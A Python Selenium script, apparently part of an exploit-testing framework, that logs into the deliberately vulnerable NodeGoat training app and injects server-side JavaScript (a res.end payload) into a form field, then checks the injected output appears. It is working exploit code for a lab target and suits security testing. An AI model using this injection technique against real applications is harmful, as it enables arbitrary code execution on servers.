from selenium.webdriver.common.by import By
from data.exploits.framework.BasicExploit import BasicExploit

class Exploit(BasicExploit):

    attributes = {
          "Name" : "Nodegoat_Injection_Server",
          "Description" : "",
          "Target" : "nodegoat",
          "Container" : "ubuntu-node-mongo",
          "Type" : ""
    }

    def runExploit(self):
      wrapper = self.wrapper
      wrapper.navigate("http://localhost:49160/login")
      wrapper.find("userName").keys("goat")
      wrapper.find("password").keys("123")
      wrapper.find("btn-default").click()

      wrapper.navigate("http://localhost:49160/contributions")
      wrapper.find("preTax").clear()
      wrapper.find("preTax").keys("res.end(\"<div id='pwn'>PWN</div>\")");
      wrapper.find("btn-default").click()
      txt = wrapper.find("pwn").raw.text
      self.assertIn("PWN", txt, "Exploit didn't work!")